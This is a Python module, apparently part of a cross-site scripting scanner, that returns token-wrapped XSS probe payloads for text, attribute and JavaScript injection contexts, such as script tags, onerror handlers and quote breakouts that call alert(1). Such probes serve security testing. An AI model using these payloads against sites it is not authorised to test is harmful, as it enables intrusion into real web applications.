"""PayloadGenerator: generate payloads per injection context.

Supported contexts: text, attr_value, attr_name, js
"""
import random
import string

class PayloadGenerator:
    def __init__(self, unique_token=None):
        # unique token to help detect reflections and avoid false positives
        self.unique_token = unique_token or self._rand_token(6)

    def _rand_token(self, n=6):
        return "".join(random.choice(string.ascii_lowercase) for _ in range(n))

    def _wrap(self, s):
        # wrap payload with token to ease detection and context finding
        return f"{self.unique_token}:{s}:{self.unique_token}"

    def get_payloads(self, context):
        ctx = (context or "").lower()

        if ctx == "text":
            return [
                self._wrap("<script>alert(1)</script>"),
                self._wrap("<img src=x onerror=alert(1)>")
            ]

        if ctx == "attr_value":
            return [
                self._wrap('\" onerror=alert(1) \"'),
                self._wrap('\" onmouseover=alert(1) \"'),
                self._wrap('\"/><img src=x onerror=alert(1)>')
            ]

        if ctx == "attr_name":
            return [
                self._wrap("onerror"),
                self._wrap("onmouseover"),
                self._wrap("xssattr")
            ]

        if ctx == "js":
            return [
                self._wrap("');alert(1);//"),
                self._wrap(";alert(String.fromCharCode(88,83,83));")
            ]

        # fallback: combine text and attr_value styles
        return [
            self._wrap("<script>alert(1)</script>"),
            self._wrap('\" onerror=alert(1) \"')
        ]
